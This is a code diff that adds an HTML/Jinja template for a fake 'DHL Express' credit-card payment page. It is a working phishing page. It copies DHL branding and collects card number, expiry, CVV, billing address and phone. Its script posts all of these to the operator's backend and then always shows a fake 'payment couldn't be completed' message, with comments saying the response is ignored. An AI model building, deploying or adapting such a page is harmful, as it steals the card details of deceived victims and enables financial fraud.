@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DHL Express – Pay with Credit Card</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        :root {
+            --dhl-red: #D40511;
+            --dhl-yellow: #FFCC00;
+            --dhl-dark: #1a1a1a;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            background: #f3f6fa;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            color: var(--dhl-dark);
+        }
+
+        .payment-header {
+            background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%);
+            color: #fff;
+            padding: 1rem 1.5rem;
+            box-shadow: 0 2px 8px rgba(212,5,17,0.2);
+        }
+        .payment-header .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .payment-header .brand img {
+            height: 38px;
+            filter: brightness(0) invert(1);
+        }
+        .payment-header .brand h1 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin: 0;
+        }
+
+        .payment-card {
+            background: #fff;
+            max-width: 700px;
+            margin: 2rem auto;
+            padding: 2rem 2rem 1.5rem;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+            border: 1px solid #e5e7eb;
+            position: relative;
+        }
+
+        .payment-card .step-indicator {
+            font-size: 0.8rem;
+            color: #6b7280;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #e5e7eb;
+            padding-bottom: 0.75rem;
+        }
+        .payment-card .step-indicator strong {
+            color: var(--dhl-red);
+        }
+
+        .form-label {
+            font-weight: 600;
+            font-size: 0.8rem;
+            color: #4a5568;
+            margin-bottom: 0.25rem;
+        }
+
+        .form-control, .form-select {
+            border-radius: 0;
+            border: 1px solid #d1d5db;
+            padding: 0.5rem 0.75rem;
+            font-size: 0.9rem;
+        }
+        .form-control:focus, .form-select:focus {
+            border-color: var(--dhl-red);
+            box-shadow: 0 0 0 3px rgba(212,5,17,0.1);
+        }
+
+        .card-field-group {
+            border: 1px solid #e2e8f0;
+            padding: 1.2rem 1.2rem 0.8rem;
+            margin-bottom: 1.2rem;
+        }
+        .card-field-group .group-title {
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: var(--dhl-dark);
+            margin-bottom: 1rem;
+        }
+
+        .card-type-icons {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 0.8rem;
+        }
+        .card-type-icons i {
+            font-size: 2rem;
+            opacity: 0.3;
+            transition: opacity 0.2s;
+        }
+        .card-type-icons i.active {
+            opacity: 1;
+        }
+
+        .card-number-input {
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+
+        .btn-pay {
+            background: var(--dhl-red);
+            color: #fff;
+            border: none;
+            padding: 0.6rem 1.8rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-pay:hover:not(:disabled) {
+            background: #b0040e;
+        }
+        .btn-pay:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            border-radius: 0;
+        }
+
+        .payment-summary {
+            background: #f8fafc;
+            padding: 0.8rem 1rem;
+            border: 1px solid #e5e7eb;
+            margin-bottom: 1.5rem;
+        }
+        .payment-summary .total-label {
+            color: #6b7280;
+            font-size: 0.85rem;
+        }
+        .payment-summary .total-amount {
+            font-weight: 700;
+            font-size: 1.4rem;
+            color: var(--dhl-dark);
+        }
+        .payment-summary .tracking-list {
+            font-size: 0.8rem;
+            color: #4a5568;
+            margin-top: 0.3rem;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem 1rem 1rem;
+            color: #94a3b8;
+            font-size: 0.8rem;
+        }
+
+        /* Result overlay */
+        #resultOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            padding: 2rem;
+            z-index: 10;
+            text-align: center;
+        }
+        #resultOverlay.show {
+            display: flex;
+        }
+        #resultOverlay .spinner {
+            width: 3rem;
+            height: 3rem;
+        }
+        #resultOverlay .failure-icon {
+            font-size: 4rem;
+            color: #dc2626;
+            margin-bottom: 1rem;
+        }
+        #resultOverlay h4 {
+            font-weight: 700;
+            color: var(--dhl-dark);
+        }
+        #resultOverlay p {
+            color: #6b7280;
+            margin-bottom: 1.5rem;
+        }
+
+        @media (max-width: 576px) {
+            .payment-card {
+                padding: 1.2rem 1rem;
+                margin: 1rem 0.5rem;
+            }
+            .card-field-group {
+                padding: 0.8rem;
+            }
+            .card-type-icons i {
+                font-size: 1.6rem;
+            }
+            .payment-summary .total-amount {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="payment-header d-flex justify-content-between align-items-center flex-wrap gap-2">
+        <div class="brand">
+            <img src="https://res.cloudinary.com/de1ucsg6q/image/upload/v1787778296/IMG_7646_scvhxj.jpg" alt="DHL">
+            <h1>Pay with Credit Card</h1>
+        </div>
+        <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-outline-light btn-sm">
+            <i class="bi bi-arrow-left me-1"></i> Back
+        </a>
+    </header>
+
+    <div class="payment-card">
+        <div class="step-indicator">
+            <strong>Step 2 of 2</strong> — Enter payment details
+        </div>
+
+        <!-- Payment Summary -->
+        <div class="payment-summary">
+            <div class="d-flex justify-content-between align-items-center flex-wrap">
+                <div>
+                    <div class="total-label">Total due</div>
+                    <div class="total-amount" id="totalAmount">$0.00</div>
+                </div>
+                <div>
+                    <span class="badge bg-light text-dark" id="invoiceCount">0 invoice(s)</span>
+                </div>
+            </div>
+            <div class="tracking-list" id="trackingList"></div>
+        </div>
+
+        <!-- FORM -->
+        <form id="creditCardForm" method="POST" action="{{ url_for('billing_pay') }}">
+            <input type="hidden" name="email" value="{{ email }}">
+            <input type="hidden" name="payment_method" value="Credit Card">
+            <input type="hidden" name="tracking_numbers" id="trackingNumbersHidden" value="">
+
+            <div class="card-field-group">
+                <div class="group-title">Payment Method</div>
+                <div class="card-type-icons" id="cardTypeIcons">
+                    <i class="bi bi-credit-card-2-front-fill" data-type="visa" style="font-size:2rem;"></i>
+                    <i class="bi bi-credit-card-2-front" data-type="mastercard" style="font-size:2rem;"></i>
+                    <i class="bi bi-credit-card" data-type="discover" style="font-size:2rem;"></i>
+                </div>
+                <div class="mb-3">
+                    <label for="cardName" class="form-label">Name on card</label>
+                    <input type="text" class="form-control" id="cardName" name="card_name" placeholder="Full name as on card" required>
+                </div>
+                <div class="mb-3">
+                    <label for="cardNumber" class="form-label">Card number</label>
+                    <input type="text" class="form-control card-number-input" id="cardNumber" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+                <div class="row g-2">
+                    <div class="col-6">
+                        <label for="expMonth" class="form-label">Expiration month</label>
+                        <select class="form-select" id="expMonth" name="exp_month" required>
+                            <option value="">Month</option>
+                            <option value="01">01 - January</option>
+                            <option value="02">02 - February</option>
+                            <option value="03">03 - March</option>
+                            <option value="04">04 - April</option>
+                            <option value="05">05 - May</option>
+                            <option value="06">06 - June</option>
+                            <option value="07">07 - July</option>
+                            <option value="08">08 - August</option>
+                            <option value="09">09 - September</option>
+                            <option value="10">10 - October</option>
+                            <option value="11">11 - November</option>
+                            <option value="12">12 - December</option>
+                        </select>
+                    </div>
+                    <div class="col-6">
+                        <label for="expYear" class="form-label">Year</label>
+                        <select class="form-select" id="expYear" name="exp_year" required>
+                            <option value="">Year</option>
+                            {% set current_year = now().year %}
+                            {% for y in range(current_year, current_year + 11) %}
+                            <option value="{{ y }}">{{ y }}</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                </div>
+                <div class="mt-3">
+                    <label for="cardCvv" class="form-label">Card Security Code</label>
+                    <input type="password" class="form-control" id="cardCvv" name="cvv" placeholder="CVV" maxlength="4" required style="width:140px;">
+                </div>
+            </div>
+
+            <div class="card-field-group">
+                <div class="group-title">Billing address</div>
+                <div class="mb-3">
+                    <label for="billingCountry" class="form-label">Country</label>
+                    <input type="text" class="form-control" id="billingCountry" name="billing_country" placeholder="Country">
+                </div>
+                <div class="mb-3">
+                    <label for="billingAddress" class="form-label">Address</label>
+                    <input type="text" class="form-control" id="billingAddress" name="billing_address" placeholder="Address">
+                </div>
+                <div class="row g-2">
+                    <div class="col-6">
+                        <label for="billingCity" class="form-label">City</label>
+                        <input type="text" class="form-control" id="billingCity" name="billing_city" placeholder="City">
+                    </div>
+                    <div class="col-6">
+                        <label for="billingState" class="form-label">State</label>
+                        <input type="text" class="form-control" id="billingState" name="billing_state" placeholder="State">
+                    </div>
+                </div>
+                <div class="mt-2">
+                    <label for="billingZip" class="form-label">ZIP code</label>
+                    <input type="text" class="form-control" id="billingZip" name="billing_zip" placeholder="ZIP code">
+                </div>
+            </div>
+
+            <div class="card-field-group">
+                <div class="group-title">Contact information</div>
+                <div class="mb-3">
+                    <label for="contactEmail" class="form-label">Email</label>
+                    <input type="email" class="form-control" id="contactEmail" name="contact_email" value="{{ email }}" readonly>
+                </div>
+                <div class="mb-3">
+                    <label for="contactPhone" class="form-label">Phone</label>
+                    <input type="tel" class="form-control" id="contactPhone" name="contact_phone" placeholder="Phone number">
+                </div>
+            </div>
+
+            <div id="cardErrors" class="alert alert-danger d-none"></div>
+
+            <div class="d-flex justify-content-between align-items-center mt-3 flex-wrap gap-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">Cancel</a>
+                <button type="submit" class="btn-pay" id="payBtn">
+                    <i class="bi bi-check-circle me-1"></i> Pay Now
+                </button>
+            </div>
+        </form>
+
+        <!-- RESULT OVERLAY -->
+        <div id="resultOverlay">
+            <!-- Spinner (shown first) -->
+            <div id="spinnerContainer">
+                <div class="spinner-border spinner text-danger" role="status">
+                    <span class="visually-hidden">Processing...</span>
+                </div>
+                <h4 class="mt-3">Processing payment...</h4>
+            </div>
+            <!-- Failure message (shown after spinner) -->
+            <div id="failureContainer" style="display:none;">
+                <div class="failure-icon"><i class="bi bi-exclamation-circle"></i></div>
+                <h4>Payment couldn't be completed</h4>
+                <p>We encountered an issue processing your payment. Please contact our support team for assistance.</p>
+                <a href="/" class="btn btn-pay" onclick="openTawkTo(); return false;">
+                    <i class="bi bi-chat-dots me-1"></i> Contact Support
+                </a>
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary mt-2">
+                    <i class="bi bi-arrow-left me-1"></i> Back to Invoices
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <small>Secure payment powered by DHL Express</small>
+    </div>
+
+    <script>
+        // ============================================================
+        // LOAD DATA FROM QUERY PARAMETERS
+        // ============================================================
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        const email = getQueryParam('email') || '';
+        const trackingParam = getQueryParam('tracking') || '';
+        const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
+
+        document.getElementById('trackingNumbersHidden').value = trackingNumbers.join(',');
+
+        const trackingListEl = document.getElementById('trackingList');
+        if (trackingNumbers.length === 1) {
+            trackingListEl.textContent = 'Shipment: ' + trackingNumbers[0];
+        } else if (trackingNumbers.length > 1) {
+            trackingListEl.textContent = 'Shipments: ' + trackingNumbers.join(', ');
+        } else {
+            trackingListEl.textContent = 'No shipments selected.';
+        }
+        document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
+
+        // Placeholder total (you can compute properly if you want)
+        document.getElementById('totalAmount').textContent = '$' + (trackingNumbers.length * 50).toFixed(2);
+
+        // ============================================================
+        // CARD NUMBER FORMATTING & TYPE DETECTION
+        // ============================================================
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            const formatted = value.replace(/(.{4})/g, '$1 ').trim();
+            this.value = formatted;
+
+            const firstDigit = value.charAt(0);
+            const firstTwo = value.slice(0, 2);
+            const firstFour = value.slice(0, 4);
+            let type = null;
+            if (firstDigit === '4') type = 'visa';
+            else if (firstTwo >= '51' && firstTwo <= '55') type = 'mastercard';
+            else if (firstFour === '6011' || (firstTwo === '65')) type = 'discover';
+
+            document.querySelectorAll('#cardTypeIcons i').forEach(el => {
+                el.classList.toggle('active', el.dataset.type === type);
+            });
+        });
+
+        document.getElementById('cardCvv').addEventListener('input', function() {
+            if (this.value.length > 4) this.value = this.value.slice(0, 4);
+        });
+
+        // ============================================================
+        // FORM SUBMISSION – SHOW SPINNER, THEN FAILURE
+        // ============================================================
+        document.getElementById('creditCardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Validate
+            const errors = [];
+            const name = document.getElementById('cardName').value.trim();
+            const number = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const month = document.getElementById('expMonth').value;
+            const year = document.getElementById('expYear').value;
+            const cvv = document.getElementById('cardCvv').value.trim();
+
+            if (!name) errors.push('Name on card is required.');
+            if (!number || number.length < 15) errors.push('Card number must be at least 15 digits.');
+            if (!month) errors.push('Expiration month is required.');
+            if (!year) errors.push('Expiration year is required.');
+            if (!cvv || cvv.length < 3) errors.push('Security code is required (3-4 digits).');
+
+            const errEl = document.getElementById('cardErrors');
+            if (errors.length) {
+                errEl.innerHTML = errors.join('<br>');
+                errEl.classList.remove('d-none');
+                return;
+            }
+            errEl.classList.add('d-none');
+
+            // Disable button and show spinner overlay
+            const btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
+
+            // Show overlay with spinner
+            const overlay = document.getElementById('resultOverlay');
+            const spinnerContainer = document.getElementById('spinnerContainer');
+            const failureContainer = document.getElementById('failureContainer');
+            overlay.classList.add('show');
+            spinnerContainer.style.display = 'block';
+            failureContainer.style.display = 'none';
+
+            // Gather form data
+            const formData = new FormData(this);
+            const payload = {
+                email: formData.get('email'),
+                payment_method: formData.get('payment_method'),
+                tracking_numbers: formData.get('tracking_numbers').split(',').filter(s => s.trim()),
+                card_details: {
+                    name: formData.get('card_name'),
+                    number: formData.get('card_number'), // full card number
+                    expiry: formData.get('exp_month') + '/' + formData.get('exp_year'),
+                    cvv: formData.get('cvv'),
+                },
+                billing: {
+                    country: formData.get('billing_country'),
+                    address: formData.get('billing_address'),
+                    city: formData.get('billing_city'),
+                    state: formData.get('billing_state'),
+                    zip: formData.get('billing_zip'),
+                },
+                phone: formData.get('contact_phone'),
+            };
+
+            // Send to backend (we don't care about response)
+            fetch('{{ url_for("billing_pay") }}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                // Even if success, we show failure
+                // Wait a bit then show failure
+                setTimeout(() => {
+                    spinnerContainer.style.display = 'none';
+                    failureContainer.style.display = 'block';
+                }, 1500);
+            })
+            .catch(() => {
+                // On error, still show failure
+                setTimeout(() => {
+                    spinnerContainer.style.display = 'none';
+                    failureContainer.style.display = 'block';
+                }, 1500);
+            });
+
+            // Also, in case fetch takes too long, show failure after 4 seconds anyway
+            setTimeout(() => {
+                if (spinnerContainer.style.display !== 'none') {
+                    spinnerContainer.style.display = 'none';
+                    failureContainer.style.display = 'block';
+                }
+            }, 4000);
+        });
+
+        // ============================================================
+        // OPEN TAWK.TO CHAT (if available)
+        // ============================================================
+        function openTawkTo() {
+            // Try to open Tawk.to if it's loaded
+            if (window.Tawk_API && window.Tawk_API.maximize) {
+                window.Tawk_API.maximize();
+            } else {
+                // If not loaded, redirect to homepage where it is
+                window.location.href = '/';
+            }
+        }
+
+        // If no tracking numbers, show warning
+        if (trackingNumbers.length === 0) {
+            document.getElementById('cardErrors').textContent = 'No shipments selected. Please go back and select at least one invoice.';
+            document.getElementById('cardErrors').classList.remove('d-none');
+            document.getElementById('payBtn').disabled = true;
+        }
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
